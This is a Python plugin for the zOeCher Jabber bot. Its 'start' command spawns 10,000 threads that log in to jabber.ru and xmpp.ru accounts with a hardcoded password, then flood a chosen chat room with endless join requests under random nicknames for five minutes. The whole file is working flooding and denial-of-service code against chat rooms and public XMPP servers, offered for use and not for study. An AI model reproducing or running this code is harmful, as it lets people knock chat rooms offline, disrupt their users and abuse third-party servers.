# zoecher 6.x plugin
# -*- coding: utf-8 -*-
#####################################################################
# This file is part of zOeCher 6.x
# Plugin 4 zOeCher Jabber Bot
# Coded By Silent.Hell (admin@smz.im)
# Official site: http://smz.im
# All Rights Reserved, Copyright © 2o13
#####################################################################

import os, xmpp, time, sys, time, pdb, urllib, threading, types, random


hanger2 = 0
servers_ru = ['jabber.ru','xmpp.ru']

def hanger2_join(cl, groupchat):
  nick = '|SM|['+str(random.randrange(00, 1000))+u']'
  prs = xmpp.protocol.Presence(groupchat+'/'+nick)
  prs.setTag('x', namespace=xmpp.NS_MUC).addChild('history', {'maxchars':'0', 'maxstanzas':'0'})
  try:
    cl.send(prs)
  except:
    pass

def hanger2_timer(type,source,parameters):
  global hanger2
  time.sleep(300)
  if hanger2:
    hanger2 = 0
    reply(type, source, u'Finished!')

def hanger2_thread(p):
  if len(p)>10:
    if p[0] in [101] and p[6] in [49]:
      return True
  return False
		      
def hanger2_start(type,source,parameters):
  global hanger2
  if parameters:
    if not parameters.count('@'):
      reply(type, source, u'Wrong command.')
      return
    body = parameters.split()
    if parameters.count(u'santa'):
      reply(type, source, u'Wrong room.')
      return
    conf = body[0].lower()
    hanger2 = 1
    reply(type,source,u'Ok')
    threading.Thread(None, hanger2_timer, 'hanger2_timer'+str(random.randrange(0, 999)), (type,source,parameters)).start()
    for x in range(0, 10000):
      threading.Thread(None, auther, 'auther'+str(random.randrange(0, 999)), (type,source,conf)).start()

           

def auther(type,source,conf):
  if not hanger2:
    return
  try:
    resourez = '|SM|['+str(random.randrange(00, 1000))+u']'
    gservz = servers_ru
    userz = 'zOeCher['+str(random.randrange(00, 100))+']'
    passwordz = 'iam.syrian'
    name, domain, password, newBotJid, mainRes = userz, gservz, passwordz, 0, 'SM'
    node = unicode(name)
    lastnick = name
    jid = xmpp.protocol.JID(node=node, domain=domain, resource=mainRes)
    psw = u''
    cl = xmpp.Client(jid.getDomain(), debug=[])
    con = cl.connect()
    if not con:
      threading.Thread(None, auther, 'auther'+str(random.randrange(0, 999)), (type,source,conf)).start()
      return
    au=cl.auth(jid.getNode(), password, jid.getResource())
    cl.sendInitPresence()
    if cl.isConnected():
      threading.Thread(None, cycle, 'cycle'+str(random.randrange(0, 999)), (cl,conf)).start()
    else:
      threading.Thread(None, auther, 'auther', (type,source,conf)).start()
      return
  except:
    pass

def cycle(cl, conf):
  z=0
  while hanger2 and cl.isConnected():
    hanger2_join(cl, conf)
    z+=1
  if hanger2:
    try:
      threading.Thread(None, auther, 'auther'+str(random.randrange(0, 999)), ('','',conf)).start()
    except:
      pass
  else:
    try:
      cl.disconnect()
    except:
      pass

def hanger2_stop(type, source, parameters):
  global hanger2
  if hanger2:
    hanger2 = 0
    reply(type,source,u'Stopped')
    return
  else:
    reply(type,source,u'Not Active')

register(hanger2_start, Prefix+'start', 9)
register(hanger2_stop, Prefix+'stop', 9)
#########################################################################################

